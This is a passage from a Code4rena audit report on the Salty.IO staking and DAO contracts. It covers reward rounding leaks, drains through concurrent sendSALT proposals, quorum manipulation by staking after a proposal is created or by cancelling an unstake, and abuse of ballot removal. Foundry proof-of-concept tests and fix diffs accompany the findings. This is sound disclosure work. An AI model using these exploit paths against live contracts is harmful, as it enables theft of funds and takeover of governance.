<https://github.com/othernet-global/salty-io/blob/main/src/staking/StakingRewards.sol#L122-L123>

[These lines](https://github.com/othernet-global/salty-io/blob/main/src/staking/StakingRewards.sol#L122-L123) were changed as a fix to M-01. `virtualRewardsToRemove` is now rounded up since it needs to be deducted later on from `claimableRewards` on L138.
While this is okay here, it has now led to a rounding of `user.virtualRewards` against the protocol, causing loss inside [claimAllRewards()](https://github.com/othernet-global/salty-io/blob/main/src/staking/StakingRewards.sol#L161-L166).

### New Issue

`_decreaseShare()` is not the only function which enables a user to claim rewards. `claimAllRewards()` can be called too by the user. `claimAllRewards()` internally calls [userRewardForPool()](https://github.com/othernet-global/salty-io/blob/main/src/staking/StakingRewards.sol#L237) which makes use of the `user.virtualRewards` variable in [L250-256](https://github.com/othernet-global/salty-io/blob/main/src/staking/StakingRewards.sol#L250-L256). Since the new fix reduced `user.virtualRewards` to a greater extent than it did in the previous implementation, [L256](https://github.com/othernet-global/salty-io/blob/main/src/staking/StakingRewards.sol#L256) can now return a user reward greater than it did in the previous implementation. The fix has caused the rounding of userRewardForPool against the protocol.

### Impact

Calculation does not round in favour of the protocol, which means that value may leak from the system in favour of the users. This vulnerability enables users to claim more rewards than they are entitled to. Although each instance might involve a small amount, the cumulative effect could be significant due to the frequency of occurrences.

More importantly, this may even cause the last reward claim to witness a scenario where there are not enough rewards to pay them out.

### Recommended Mitigation Steps

While this can be approached in multiple ways, to avoid confusion let's have two separate variables for `virtualRewardsToRemove` accounting, one rounded-up and one rounded-down:

<details>

```diff
  File: src/staking/StakingRewards.sol

  // Decrease a user's share for the pool and have any pending rewards sent to them.
  // Does not require the pool to be valid (in case the pool was recently unwhitelisted).
  function _decreaseUserShare( address wallet, bytes32 poolID, uint256 decreaseShareAmount, bool useCooldown ) internal
  {
    require( decreaseShareAmount != 0, "Cannot decrease zero share" );

    UserShareInfo storage user = _userShareInfo[wallet][poolID];
    require( decreaseShareAmount <= user.userShare, "Cannot decrease more than existing user share" );

    if ( useCooldown )
      if ( msg.sender != address(exchangeConfig.dao()) ) // DAO doesn't use the cooldown
      {
      require( block.timestamp >= user.cooldownExpiration, "Must wait for the cooldown to expire" );

      // Update the cooldown expiration for future transactions
      user.cooldownExpiration = block.timestamp + stakingConfig.modificationCooldown();
      }

    // Determine the share of the rewards for the amountToDecrease (will include previously added virtual rewards)
    uint256 rewardsForAmount = ( totalRewards[poolID] * decreaseShareAmount ) / totalShares[poolID];

    // For the amountToDecrease determine the proportion of virtualRewards (proportional to all virtualRewards for the user)
-   // Round virtualRewards up in favor of the protocol
-   uint256 virtualRewardsToRemove = Math.ceilDiv(user.virtualRewards * decreaseShareAmount,  user.userShare );
+   // Round virtualRewardsToRemoveFromClaimable up in favor of the protocol
+   uint256 virtualRewardsToRemoveFromClaimable = Math.ceilDiv(user.virtualRewards * decreaseShareAmount,  user.userShare );
+   // Round virtualRewardsToRemoveFromUserVirtRewards down in favor of the protocol
+   uint256 virtualRewardsToRemoveFromUserVirtRewards = (user.virtualRewards * decreaseShareAmount) / user.userShare;

    // Update totals
    totalRewards[poolID] -= rewardsForAmount;
    totalShares[poolID] -= decreaseShareAmount;

    // Update the user's share and virtual rewards
    user.userShare -= decreaseShareAmount;
-   user.virtualRewards -= virtualRewardsToRemove;
+   user.virtualRewards -= virtualRewardsToRemoveFromUserVirtRewards;

    uint256 claimableRewards = 0;

    // Some of the rewardsForAmount are actually virtualRewards and can't be claimed.
-   // In the event that virtualRewards are greater than actual rewards - claimableRewards will stay zero.
-   if ( virtualRewardsToRemove < rewardsForAmount )
-     claimableRewards = rewardsForAmount - virtualRewardsToRemove;
+   // In the event that virtualRewardsToRemoveFromClaimable are greater than actual rewards - claimableRewards will stay zero.
+   if ( virtualRewardsToRemoveFromClaimable < rewardsForAmount )
+     claimableRewards = rewardsForAmount - virtualRewardsToRemoveFromClaimable;

    // Send the claimable rewards
    if ( claimableRewards != 0 )
      salt.safeTransfer( wallet, claimableRewards );

    emit UserShareDecreased(wallet, poolID, decreaseShareAmount, claimableRewards);
  }
```
</details>

**[Picodes (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/25#issuecomment-1992060388)**

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/25#issuecomment-1996383606):**
 > Fixed in: https://github.com/othernet-global/salty-io/commit/0281d1d2cb61cf6291f0468d492e4ca4998831d3

***

## [Multiple sendSALT proposals can now get approved and together all at once spend more than `5%` of the current SALT balance of the DAO](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/60)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/60)*

Severity: Medium

The [comment on L199](https://github.com/othernet-global/salty-io/blob/main/src/dao/Proposals.sol#L199) above `proposeSendSALT()` clearly states (just like in the previous implementation) that:

```js
  // Only one sendSALT Ballot can be open at a time and the sending limit is 5% of the current SALT balance of the DAO.
```

The fix applied for [M-12](https://github.com/code-423n4/2024-01-salty-findings/issues/621) on [L209](https://github.com/othernet-global/salty-io/blob/main/src/dao/Proposals.sol#L209) however has changed the unique ballot name now which means multiple proposals for `proposeSendSALT()` can now be opened concurrently and drain more than `5%` of DAO's SALT balance.

### Impact

The presence of multiple concurrent proposals for `proposeSendSALT()` means that now 2 ballots (or 20) could get approved simultaneously and all of a sudden 10% (or 100%) of DAO's SALT balance can be drained.
In the worst case, a malicious user with large SALT balance or a group of coordinating malicious users could come together and create multiple proposals simultaneously. Since the balance of DAO does not diminish when proposal is created but only when the ballot is executed at finalization & a transfer made, 20 such proposals are enough to drain 100%.

### Recommended Mitigation Steps

Since we want to avoid the front-running & DOS attack highlighted in M-12 while still safeguarding DAO's `95%` SALT balance, the following steps are recommended:

*   Since even in the old implementation `proposeSendSALT()` could be finalized every 14 days, transferring 5% of the balance each time, similarly enforce a 14-day (or X days) of wait period between any two ballot finalizations. Let's imagine a possible scenario to make things clearer:
    *   2 proposals are created simultaneously.
    *   Proposal-1 finalizes after 15 days. `5%` SALT is transferred.
    *   Proposal-2 reaches quorum on the 16th day and can be finalized & passed. However, since the last sendSALT proposal made a transfer just 1 day ago, proposal-2 needs to wait another 13 days before attempting finalization again.

*   This also means the protocol will have to take care that the upper ceiling of `amount` is `5%` of the ***current balance***. This is because when the proposal was created, the first ballot had not finalized & transferred SALT and hence `5%` would have evaluated to a greater amount. So at the time of finalization or while doing the transfer, perform a check along the lines of:

```js
  uint256 currentBalance = exchangeConfig.salt().balanceOf( address(exchangeConfig.dao()) );
  if (amount > currentBalance * 5 / 100)
    amount = currentBalance;
```

**[0xpiken commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/60#issuecomment-1994781761):**
 > The severity of this issue is over-inflated.
> At least 30% of voting power is required to approve a `SEND_SALT` ballot.
> it's hard to imagine one malicious user can own over 30% of voting power, or a group of malicious users collude to take control of more than 30% of the voting power and drain SALT from DAO.

**[othernet-global (Salty.IO) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/60#issuecomment-1996232837):**
 > A 7 day Send SALT cooldown has now been added to combat rapid drainage.
> 
> The 5% limit is still based on the initial reserves at the time of proposal creation.  After 30 days of ballots not being finalized anyone can manual finalize a ballot (without execution) - limiting the number of Send SALT ballots that could be executed if spammed.
> 
> Fixed with: https://github.com/othernet-global/salty-io/commit/5260d9bd49fad4fd712daeb65979936392531dd7

**[Picodes (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/60#issuecomment-1996710902):**
 > @piken thanks for flagging. I don't know why I thought the severity of this issue was Med as the original issue was Med.
> 
> This issue is without a doubt Medium severity.
> 
> You need to:
> 
>  - Have at least 30% of the voting power for the proposals to pass
>  - Not have other holders voting against your proposals
>  - Assuming you have all this you will still be able to drain salt, it'll just take longer
> 
> I don't see how these conditions aren't "a hypothetical attack path with stated assumptions, but external requirements" but are a "direct attack".


***

## [Partial snapshot means staking after proposal creation gives unfair benefit](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/6)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/6), also found by [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/58)*

Severity: Medium

The [mitigation](https://github.com/othernet-global/salty-io/commit/c46069644739885fa36e84e27e1dd6362b854663) for [M-11](https://github.com/code-423n4/2024-01-salty-findings/issues/716) is meant to stop the user from getting extra voting power (by reducing the quorum) via unstaking their SALT after proposal creation. Although the fix on [L110](https://github.com/othernet-global/salty-io/blob/main/src/dao/Proposals.sol#L110) successfully mitigates the existing issue by saving the value of `requiredQuorum` at the time of proposal creation, new attack vectors open up due to it.

### Attack Vector 1

*   Suppose the initial staked amount in the system is `6_000_000` (all figures in `ether`, so `6_000_000 * 10**18`).
*   Alice has `630_000` with her which she wants to stake and float a proposal.
*   It works in Alice's favour to not stake all the amount at once. This is because if she stakes all at once, the required quorum would be `10% of (6_000_000 + 630_000) = 663_000` and hence she will have to depend on others for her proposal to pass. She realizes there's a better way to keep the required quorum value in her favour.
*   Alice stakes with `aliceStakedAmount_1 = 60_000` and floats a proposal.
*   The `requiredQuorum` right now is `10%` which equals `  606000 `.
*   She now stakes her remaining `aliceStakedAmount_2 = 570_000`. This can be staked immediately after proposal creation or after a wait time of 14 days.
*   Alice votes `yes`. Her proposal now has `630_000` votes, surpassing the `requiredQuorum` and hence passing the proposal.
*   Alice can now *optionally* choose to unstake her SALT.

### Attack Vector 2

*   Suppose the initial staked amount in the system is `6_000_000` (all figures in `ether`, so `6_000_000 * 10**18`).
*   Alice **has already staked** `630_000` and she now wants to float a new proposal.
*   Alice **unstakes** `570_000`. She only has `60_000` staked now.
*   She floats a proposal.
*   The `requiredQuorum` right now is `10%` which equals `  606000 `.
*   She now calls `cancelUnstake()` to get her `570_000` back.
*   Alice votes `yes`. Her proposal now has `630_000` votes, surpassing the `requiredQuorum` and hence passing the proposal.

### Recommended Mitigation Steps

It is not sufficient to only save the snapshot by storing the `requiredQuorum` on [L110](https://github.com/othernet-global/salty-io/blob/main/src/dao/Proposals.sol#L110) at proposal creation time. The protocol needs to also save the voting power of the users at that timestamp. Any SALT staked later on can not be included in voting power.

### Proof of Concept

Add these 2 tests inside `src/dao/tests/DAO.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_t0x1c_` to see both the tests pass:

<details>

```js
  function test_t0x1c_stakingAfterProposalCreation() public {
    deal(address(salt), address(DEPLOYER), 6_000_000 ether);
    vm.prank(DEPLOYER);
    staking.stakeSALT(6_000_000 ether);

    // Set up the parameters for the proposal
    uint256 proposalNum = 0; // Assuming an enumeration starting at 0 for parameter proposals
    uint256 ballotID = 1;
    deal(address(salt), address(alice), 630_000 ether);

    // Alice stakes her SALT to get voting power
    uint256 aliceStakedAmount_1 = 60_000 ether;
    uint256 aliceStakedAmount_2 = 570_000 ether;

    vm.startPrank(alice);
    staking.stakeSALT(aliceStakedAmount_1);

    // Propose a parameter ballot
    proposals.proposeParameterBallot(proposalNum, "Increase max pools count");
    emit log_named_decimal_uint("requiredQuorumForBallotType =", proposals.requiredQuorumForBallotType(BallotType.PARAMETER), 18);

    // stakes again with a much larger amount, now that the proposal has been floated
    staking.stakeSALT(aliceStakedAmount_2);

    skip(14 days);

    // Alice casts a vote, enough for quorum
    proposals.castVote(ballotID, Vote.INCREASE);

    // OPTIONAL STEP -- Alice unstakes her SALT
    // staking.unstake(aliceStakedAmount_1 + aliceStakedAmount_2, 52);
    vm.stopPrank();

    emit log_named_decimal_uint("votes cast in favour =", proposals.votesCastForBallot(ballotID, Vote.INCREASE), 18);

    // Now it should be possible to finalize the ballot
    dao.finalizeBallot(ballotID);
    // Check that the ballot is finalized
    bool isBallotFinalized = !proposals.ballotForID(ballotID).ballotIsLive;
    assertTrue(isBallotFinalized);
  }



	function test_t0x1c_cancelUnstakeToManipulateVotingPower() public {
		deal(address(salt), address(DEPLOYER), 6_000_000 ether);
		vm.prank(DEPLOYER);
		staking.stakeSALT(6_000_000 ether);
		uint256 aliceStakedAmount = 630_000 ether;
		deal(address(salt), address(alice), aliceStakedAmount);
		vm.startPrank(alice);
		staking.stakeSALT(aliceStakedAmount);


		// Set up the parameters for the proposal
		uint256 proposalNum = 0; // Assuming an enumeration starting at 0 for parameter proposals
		uint256 ballotID = 1;

		// Alice unstakes her SALT first, before floating the proposal
		uint256 aliceUnstakeAmount = 570_000 ether;
		uint256 unstakeID = staking.unstake(aliceUnstakeAmount, 52);


		// Propose a parameter ballot
		proposals.proposeParameterBallot(proposalNum, "Increase max pools count");
		emit log_named_decimal_uint("requiredQuorumForBallotType =", proposals.requiredQuorumForBallotType(BallotType.PARAMETER), 18); // only 10% of (6_000_000 + 60_000) = 606_000

		// Alice cancels her unstake
		staking.cancelUnstake(unstakeID);

		skip(14 days);

		// Alice casts a vote, enough for quorum
		proposals.castVote(ballotID, Vote.INCREASE);

		vm.stopPrank();

		emit log_named_decimal_uint("votes cast in favour =", proposals.votesCastForBallot(ballotID, Vote.INCREASE), 18);

		// Now it should be possible to finalize the ballot
		dao.finalizeBallot(ballotID);
		// Check that the ballot is finalized
		bool isBallotFinalized = !proposals.ballotForID(ballotID).ballotIsLive;
		assertTrue(isBallotFinalized);
	}
```
</details>

Output:

```js
Ran 2 tests for src/dao/tests/DAO.t.sol:TestDAO
[PASS] test_t0x1c_cancelUnstakeToManipulateVotingPower() (gas: 954702)
Logs:
  requiredQuorumForBallotType =: 606000.000000000000000000
  votes cast in favour =: 630000.000000000000000000

[PASS] test_t0x1c_stakingAfterProposalCreation() (gas: 1045244)
Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 10.52s
```

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/6#issuecomment-1993908699):**
 > Same answer as [#58](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/58). 
 >
 > I think the lower bound on the quorum based on the total supply downgrades the severity of this to Low.


***

## [`manuallyRemoveBallot()` doesn't check if the ballot can be finalized or has been removed before](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/82)
*Submitted by [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/82)*

Related to: M-19
Severity: Medium

<https://github.com/othernet-global/salty-io/blob/758349850a994c305a0ab9a151d00e738a5a45a0/src/dao/DAO.sol#L271-L279> 

<https://github.com/othernet-global/salty-io/blob/758349850a994c305a0ab9a151d00e738a5a45a0/src/dao/Proposals.sol#L131-L153>

In the original implementation, a ballot cannot be closed or canceled without meeting the required quorum, even if the `ballotMinimumEndTime` has passed.

### Mitigation

[commit 7583498](https://github.com/othernet-global/salty-io/commit/758349850a994c305a0ab9a151d00e738a5a45a0)
The mitigation introduced a variable `ballotMaximumDuration` for ballot and a function `DAO#manuallyRemoveBallot()`.
Whenever a ballot is expired, it can be removed by any one.

### Impact

Three new issues were produced due to missing status checks:

1.  Two or more living ballots with the same name can exist at the same time
2.  One eligible user can create multi ballots at the same time
3.  A ballot could be removed accidentally or intentionally even it has sufficient votes

### Proof of Concept

*   Issue 1:
    *   Alice created ballotA, which was expired without enough votes
    *   ballotA was removed by calling `DAO#manuallyRemoveBallot()`
    *   Alice created ballotB
    *   Alice called `DAO#manuallyRemoveBallot()` to remove ballotA again. `_userHasActiveProposal[Alice]` was reset to `false`
    *   Alice created ballotC successfully even ballotB is living.
*   Issue 2:
    *   Alice created ballotA(ballotID = A1), which was expired without enough votes
    *   The ballotA was removed by calling `DAO#manuallyRemoveBallot()`
    *   Alice created ballotA(ballotID = A2) again (same ballot name but different ballotID)
    *   Bob called `DAO#manuallyRemoveBallot(A1)` to remove ballot again, `openBallotsByName[ballotA]` was deleted
    *   Bob created ballotA successfully even Alice's ballotA is opened.
*   Issue 3:
    *   Alice creates a new ballot with `ballotMinimumDuration` as 10 days and `ballotMaximumDuration` as 30 days
    *   The voting number is very closed to `requiredQuorum`
    *   Bob votes on it in day 30, now the voting number reaches `requiredQuorum` threshold.
    *   However, Charlie doesn't like the voting result, he call `DAO#manuallyRemoveBallot()` to remove the vote.

POC of Issue 1 & 2:
Copy below codes to [DAO.t.sol](https://github.com/othernet-global/salty-io/blob/main/src/dao/tests/DAO.t.sol) and run `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url RPC_URL --match-test testManualRemovalBallotIssue1And2&2`

<details>

```solidity
function testManualRemovalBallotIssue1And2() public
{
    // Alice stakes her SALT to get voting power
    vm.startPrank(address(daoVestingWallet));
    salt.transfer(alice, 1000000 ether);				// for staking and voting
    salt.transfer(address(dao), 1000000 ether); // bootstrapping rewards
    vm.stopPrank();

    vm.startPrank(alice);
    staking.stakeSALT(500000 ether);

    IERC20 test = new TestERC20( "TEST", 18 );
    string memory ballotName = string.concat("whitelist:", Strings.toHexString(address(test)), "url", "description" );
    // Propose a whitelisting ballot
    proposals.proposeTokenWhitelisting(test, "url", "description");

    uint256 ballotID = 1;

    // Increase block time to finalize the ballot
    skip( daoConfig.ballotMaximumDuration() + 1);

    // Propose a whitelisting ballot
    vm.expectRevert( "Users can only have one active proposal at a time" );
    proposals.proposeTokenWhitelisting(test, "url", "description");

    dao.manuallyRemoveBallot(ballotID);
    assertEq(proposals.ballotForID(ballotID).ballotIsLive, false, "Ballot should have been removed");

    uint256 secondBallot = proposals.proposeTokenWhitelisting(test, "url", "description");
    //@audit-info a proposal named `ballotName` is created
    assertEq(proposals.openBallotsByName(ballotName), secondBallot);
    //@audit-info alice has active proposal
    assertEq(proposals.userHasActiveProposal(alice), true);

    uint256 thirdBallot;
    //@audit-info alice can not create another proposal because she has one active proposal
    vm.expectRevert( "Users can only have one active proposal at a time" );
    thirdBallot = proposals.proposeTokenWhitelisting(test, "url", "description");
    //@audit-info The closed ballot was removed again
    dao.manuallyRemoveBallot(ballotID);
    //@audit-info the proposal named `ballotName` was removed
    assertEq(proposals.openBallotsByName(ballotName), 0);
    //@audit-info alice doesn't have active proposal now
    assertEq(proposals.userHasActiveProposal(alice), false);
    //@audit-info salice created another proposal named `ballotName`
    thirdBallot = proposals.proposeTokenWhitelisting(test, "url", "description");
    //@audit-info the ballotId of `ballotName` was changed to thirdBallot
    assertEq(proposals.openBallotsByName(ballotName), thirdBallot);
}
```
</details>

POC of Issue 3:
Copy below codes to [DAO.t.sol](https://github.com/othernet-global/salty-io/blob/main/src/dao/tests/DAO.t.sol) and run `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url RPC_URL --match-test testManualRemovalBallotIssue3`

<details>

```solidity
    function testManualRemovalBallotIssue3() public
    {
        // Alice stakes her SALT to get voting power
        vm.startPrank(address(daoVestingWallet));
        salt.transfer(alice, 500000 ether);// for staking and voting
        salt.transfer(bob, 500000 ether);
        salt.transfer(address(dao), 1000000 ether); // bootstrapping rewards
        vm.stopPrank();

        //@audit-info alice creates a token whitelisting proposal
        vm.startPrank(alice);
        salt.approve(address(staking), type(uint256).max);
        staking.stakeSALT(500000 ether);
        IERC20 test = new TestERC20( "TEST", 18 );
        // Propose a whitelisting ballot
        proposals.proposeTokenWhitelisting(test, "url", "description");
        uint256 ballotID = 1;
        // Increase block time to finalize the ballot
        skip( daoConfig.ballotMaximumDuration() + 1);
        vm.stopPrank();
        //@audit-info the proposal can not be finalized without enough votes
        assertEq(proposals.canFinalizeBallot(ballotID), false);
        //@audit-info bob votes on it
        vm.startPrank(bob);
        salt.approve(address(staking), type(uint256).max);
        staking.stakeSALT(500000 ether);
        proposals.castVote(ballotID, Vote.YES);
        vm.stopPrank();
        //@audit-info the proposal can be finalized 
        assertEq(proposals.canFinalizeBallot(ballotID), true);
        //@audit-info however it can be removed
        dao.manuallyRemoveBallot(ballotID);
        assertEq(proposals.ballotForID(ballotID).ballotIsLive, false, "Ballot should have been removed");
    }
```
</details>

### Recommended Mitigation Steps

Check if the ballot is living before removing it:

```diff
function markBallotAsFinalized( uint256 ballotID ) external nonReentrant
{
    require( msg.sender == address(exchangeConfig.dao()), "Only the DAO can mark a ballot as finalized" );

    Ballot storage ballot = ballots[ballotID];
+   require(ballot.ballotIsLive, "The ballot has been finalized");
    // Remove finalized whitelist token ballots from the list of open whitelisting proposals
    if ( ballot.ballotType == BallotType.WHITELIST_TOKEN )
        _openBallotsForTokenWhitelisting.remove( ballotID );

    // Remove from the list of all open ballots
    _allOpenBallots.remove( ballotID );

    ballot.ballotIsLive = false;

    // Indicate that the user who posted the proposal no longer has an active proposal
    address userThatPostedBallot = _usersThatProposedBallots[ballotID];
    _userHasActiveProposal[userThatPostedBallot] = false;

    delete openBallotsByName[ballot.ballotName];

    emit BallotFinalized(ballotID);
}
```

Any ballot that can be finalized should not be removable:

```diff
function manuallyRemoveBallot( uint256 ballotID ) external nonReentrant
{
    Ballot memory ballot = proposals.ballotForID(ballotID);

+   require( !proposals.canFinalizeBallot(ballotID), "The ballot is able to be finalized" );
    require( block.timestamp >= ballot.ballotMaximumEndTime, "The ballot is not yet able to be manually removed" );

    // Mark the ballot as no longer votable and remove it from the list of open ballots
    proposals.markBallotAsFinalized(ballotID);
}
```

**[0xpiken (Warden) commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/82#issuecomment-1994856699):**
 > Although these three issues are described together here, I want to remind that they should be listed as two different medium issues:
>  - issue 1 & 2: One user can have more than one living ballots or more than one living ballots own same ballot name because `markBallotAsFinalized()` doesn't check if the ballot to be removed is living or not.
>  - issue 3: A `can be finalized` ballot could be removed accidentally or intentionally when time exceeds `ballotMaximumEndTime`.
> 
> The root causes of them are different, and the consequences are also different

**[t0x1c (Warden) commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/82#issuecomment-1996305198):**
 > It seems from sponsor's comments in #94 that `issue 3` is to be considered invalid?

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/82#issuecomment-1996376977):**
 > Checking that the ballot has not already been finalized is definitely important.  Thank you!
> 
> Fixed in: [bea938fb1c667be81ce4ea135b758626a756927c](https://github.com/othernet-global/salty-io/commit/bea938fb1c667be81ce4ea135b758626a756927c)
> 
> Allowing ballots to be manually ended even if they could be approved is valid.  In a governance attack there may be spammed ballots (like send SALT which can only be now executed once a week).  It can be useful for those spammed ballots to be removed.

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/82#issuecomment-1996703161):**
 > @piken Yes indeed I consider point 3 to be invalid as discussed in [#94](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/82)

## [Proposal can be removed after 30 days without owner's consent](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/2)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/2)

Severity: Low

https://github.com/othernet-global/salty-io/blob/main/src/dao/DAO.sol#L256


### Summary & Impact

The [mitigation](https://github.com/othernet-global/salty-io/commit/758349850a994c305a0ab9a151d00e738a5a45a0) for [M-19](https://github.com/code-423n4/2024-01-salty-findings/issues/362) was meant to ensure to avoid trapping the proposers indefinitely if their proposal had still not met quorum after 30 days. Hence the function [manuallyRemoveBallot()](https://github.com/othernet-global/salty-io/blob/main/src/dao/DAO.sol#L256) is introduced which can be called by **_anyone_**.

The fix incorrectly assumes that the owner will always want their proposal to be cancelled after 30 days. This is not true. If their proposal is quite close to reaching quorum, the owner may want to keep it alive for a few more days. However, a griefer or someone who has voted against the ballot can choose to delete the proposal. <br>

This choice of deleting the ballot ought to remain in the hands of only the proposal owner.

### Proof of Concept

- Total staked salt = 6,000,000 in the system right now.
- Alice stakes her 650,000 salt. The total salt staked is now 6,000,000 + 650,000 = 6,650,000
- Alice floats her proposal.
- Minimum quorum required is 10% of 6,650,000 = 665,000
- Alice votes `yes` but this is still less than minimum required quorum.
- 30 days pass. Alice can see the proposal is tantalizingly close to reaching quorum and has an overwhelming majority of `yes` votes. So she plans to wait for another couple of days.
- Bob does not want the proposal to go through. Since 30 days have passed, he calls `manuallyRemoveBallot()` to remove the proposal. 
- Alice can do nothing to stop Bob.

Add the following tests inside `src/dao/tests/DAO.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_30dayRemoval` to see the test pass:

<details>

```js
  function test_30dayRemoval() public {
      // ********************* SETUP ********************************
      deal(address(salt), address(DEPLOYER), 6_000_000 ether);
      vm.prank(DEPLOYER);
      staking.stakeSALT(6_000_000 ether);
          
      // Set up the parameters for the proposal
      uint256 proposalNum = 0; // Assuming an enumeration starting at 0 for parameter proposals
      uint256 ballotID = 1;

      // Alice stakes her SALT to get voting power
      uint256 aliceStakedAmount = 650_000 ether;
      deal(address(salt), address(alice), aliceStakedAmount);
      // ************************************************************


      vm.startPrank(alice);
      staking.stakeSALT(aliceStakedAmount);
      // Propose a parameter ballot
      proposals.proposeParameterBallot(proposalNum, "Increase max pools count");
      // Alice casts a vote, but not enough for quorum
      // minQuorum required = 10% of (6_000_000 + 650_000) ether = 665_000 ether
      proposals.castVote(ballotID, Vote.INCREASE);
      assertEq(proposals.votesCastForBallot(ballotID, Vote.INCREASE), aliceStakedAmount);
      vm.stopPrank();

      skip(30 days);
      assertEq(proposals.ballotForID(ballotID).ballotIsLive, true, "Ballot should have been Live");

      // Bob calls `manuallyRemoveBallot()` to remove the proposal
      vm.prank(bob);
      dao.manuallyRemoveBallot(ballotID);
      assertEq(proposals.ballotForID(ballotID).ballotIsLive, false, "Ballot should have been removed");
  }
```
</details>

## Recommended Mitigation Steps
Inside `manuallyRemoveBallot()`, ensure that `msg.sender` is the owner of the proposal.

## Conclusion
New attack vector created due to the fix.

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.

